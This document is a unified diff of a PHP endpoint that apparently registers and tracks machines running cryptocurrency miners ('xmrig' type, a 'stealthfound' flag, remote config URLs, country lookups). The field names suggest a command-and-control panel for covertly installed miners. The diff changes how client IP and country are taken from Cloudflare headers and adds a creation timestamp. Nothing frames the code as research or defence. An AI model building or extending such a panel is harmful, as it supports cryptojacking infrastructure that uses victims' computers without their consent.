@@ -10,8 +10,10 @@ if(json_last_error() != JSON_ERROR_NONE) {
     return;
 }
 
-$hostaddress = $_SERVER["REMOTE_ADDR"] ?? '127.0.0.1';
-$currentDate = date('Y-m-d H:i:s');
+$headers =  getallheaders();
+
+$hostaddress = $headers['CF-Connecting-IP'] ?? $_SERVER["REMOTE_ADDR"] ?? '127.0.0.1';
+$currentDate = time();
 
 //Allows for the IP to get received as data. Only use when testing or creating fake data.
 //$hostaddress = getData('ip');
@@ -46,7 +48,7 @@ $fields = [
     'ms_stealthfound'=>getData('stealthfound'),
     'ms_remoteURL'=>getData('remoteconfig'),
     'ms_lastConnection'=>$currentDate,
-    'ms_country'=>'Unknown'
+    'ms_country'=>$headers['CF-IPCountry'] ?? 'Unknown'
 ];
 
 try {
@@ -66,11 +68,14 @@ try {
         $s->execute(array_merge(array_values($fields), [$configres['ms_minerID']]));
         $s->closeCursor();
     } else {
-        $countries = get_object_vars(json_decode(file_get_contents('http://country.io/names.json')));
-        $minerCountry = file_get_contents('https://api.country.is/'.$hostaddress);
-        if (!($minerCountry === FALSE)){
-            $fields['ms_country'] = $countries[get_object_vars(json_decode($minerCountry))['country']];
+        if($fields['ms_country'] == 'Unknown'){
+            $minerCountry = file_get_contents('https://api.country.is/'.$hostaddress);
+            if (!($minerCountry === FALSE)){
+                $fields['ms_country'] = json_decode($minerCountry, true)['country'] ?? 'Unknown';
+            }
         }
+
+        $fields['ms_creationDate'] = $currentDate;
 
         $s = getConn()->prepare("INSERT INTO miners (ms_uqhash, ms_rid, ms_type, ms_config, ".implode(', ', array_keys($fields)).") VALUES (?, ?, ?, ?".str_repeat(", ?", count($fields)).")");
         $s->execute(array_merge([$uqhash, $id, $type, ($type == 'xmrig' ? 1 : 2)], array_values($fields)));
